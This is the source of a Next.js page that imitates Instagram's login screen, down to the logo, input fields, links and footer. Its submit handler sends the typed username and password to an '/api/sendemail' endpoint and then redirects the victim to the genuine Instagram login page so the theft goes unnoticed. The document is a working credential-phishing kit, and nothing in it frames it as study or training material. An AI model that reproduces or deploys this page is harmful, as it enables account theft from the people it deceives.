"use client"
import app from '@/public/app.png'
import desktop from '@/public/desktop.png'
import google from '@/public/google.png'
import Image from 'next/image'
import { useRouter } from 'next/navigation'
import { useState } from 'react'


export default function Home() {

  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });

  const router = useRouter();
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch('/api/sendemail', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      console.log(response);

      if (response.status === 200) {
        router.push("https://www.instagram.com/accounts/login/?next=%2Faccount%2Flogin%2F&source=desktop_nav");
      } else {
        alert("Problem occuring in validating user details, please try again later!")
      }
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <main className="bg-[#FFFFFF] flex flex-col justify-center items-center">
      <div className="sm:border border-[#DBDBDB] rounded-sm mt-3 min-w-[350px] flex items-center flex-col p-10 pb-2">
        <Image className='w-[174px] pb-10' src={app} alt='instagram'></Image>
        <div className='flex flex-col gap-1.5 w-full '>
          <input
            autoComplete="username-off"
            type="text"
            placeholder='Phone number, username, or email'
            name="username"
            value={formData.username}
            onChange={handleChange}
            className=' border border-gray-300 bg-[#FAFAFA] h-[36px] p-[9px_0_7px_8px] text-xs rounded-sm w-full'
          />
          <input
            autoComplete="new-password"
            type="password" placeholder='Password'
            name="password"
            value={formData.password}
            onChange={handleChange}
            className=' border border-gray-300 bg-[#FAFAFA] h-[36px] p-[9px_0_7px_8px] text-xs rounded-sm w-full'
          />
          <button onClick={handleSubmit} className='mt-2 bg-[#4CB5F9] text-white text-sm font-bold rounded-lg py-1.5 w-full'>Log in</button>

          <div className='relative my-4'>
            <hr />
            <span className='absolute left-1/2 text-xs px-4 bg-white font-semibold -top-2 text-[#A09F97] -translate-x-1/2 '>OR</span>
          </div>

          <div className='py-3 text-center text-[#385185]'>
            <a href='https://www.instagram.com/accounts/login/?next=%2Faccount%2Flogin%2F&source=desktop_nav' className=' text-sm font-semibold flex gap-2 items-center justify-center mb-5 cursor-pointer'>
              <svg
                viewBox="0 0 48 48"
                xmlns="http://www.w3.org/2000/svg"
                xmlnsXlink="http://www.w3.org/1999/xlink"
                fill="#000000"
                className='w-4 h-4'
              >
                <g id="SVGRepo_bgCarrier" strokeWidth="0"></g>
                <g id="SVGRepo_tracerCarrier" strokeLinecap="round" strokeLinejoin="round"></g>
                <g id="SVGRepo_iconCarrier">
                  <title>Facebook-color</title>
                  <desc>Created with Sketch.</desc>
                  <g
                    id="Icons"
                    stroke="none"
                    strokeWidth="1"
                    fill="none"
                    fillRule="evenodd"
                  >
                    <g id="Color-" transform="translate(-200.000000, -160.000000)" fill="#4460A0">
                      <path d="M225.638355,208 L202.649232,208 C201.185673,208 200,206.813592 200,205.350603 L200,162.649211 C200,161.18585 201.185859,160 202.649232,160 L245.350955,160 C246.813955,160 248,161.18585 248,162.649211 L248,205.350603 C248,206.813778 246.813769,208 245.350955,208 L233.119305,208 L233.119305,189.411755 L239.358521,189.411755 L240.292755,182.167586 L233.119305,182.167586 L233.119305,177.542641 C233.119305,175.445287 233.701712,174.01601 236.70929,174.01601 L240.545311,174.014333 L240.545311,167.535091 C239.881886,167.446808 237.604784,167.24957 234.955552,167.24957 C229.424834,167.24957 225.638355,170.625526 225.638355,176.825209 L225.638355,182.167586 L219.383122,182.167586 L219.383122,189.411755 L225.638355,189.411755 L225.638355,208 L225.638355,208 Z" id="Facebook"></path>
                    </g>
                  </g>
                </g>
              </svg>
              Log in with Facebook</a>
            <a href='https://www.instagram.com/accounts/password/reset/?next=%2Faccount%2Flogin%2F' className='text-xs'>Forget password?</a>
          </div>
        </div>
      </div>
      <div className='sm:border border-[#DBDBDB] rounded-sm mt-3 min-w-[350px] flex items-center flex-col w-[268px] py-5'>
        <p className='text-sm'>Don&apos;t have an account? <a className='text-[#0095F6] font-bold' href="https://www.instagram.com/accounts/emailsignup/?next=%2Faccount%2Flogin%2F">Sign up</a></p>
      </div>

      <div className='w-[350px] flex flex-col items-center py-5'>
        <p className='text-sm'>Get the app.</p>
        <div className='grid grid-cols-2 gap-2.5 py-4 px-12'>
          <a className='h-10' target='_blank' href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D6819BF55-A42A-47F9-BBCF-494CE83CC36D%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1"><Image alt='Play Store' src={google} className='h-full'></Image></a>

          <a className='h-10' target='_blank' href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1020&next=%2Faccount%2Flogin%2F"><Image alt='App Store' src={desktop} className='h-full'></Image></a>

        </div>
      </div>
      <div className='mx-auto overflow-y-visible flex-wrap justify-center footer text-xs text-gray-500 flex items-center gap-4 pt-10'>
        <span>Meta</span>
        <span>About</span>
        <span>Blog</span>
        <span>Jobs</span>
        <span>Help</span>
        <span>API</span>
        <span>Privacy</span>
        <span>Terms</span>
        <span>Locations</span>
        <span>Instagram Lite</span>
        <span>Threads</span>
        <span>Contact Uploading & Non-Users</span>
        <span>Meta Verified</span>
      </div>

      <div className='text-xs text-gray-500 pt-5 mb-10'>
        <span className='px-4'>English</span> © 2023 Instagram from Meta
      </div>
    </main>
  )
}
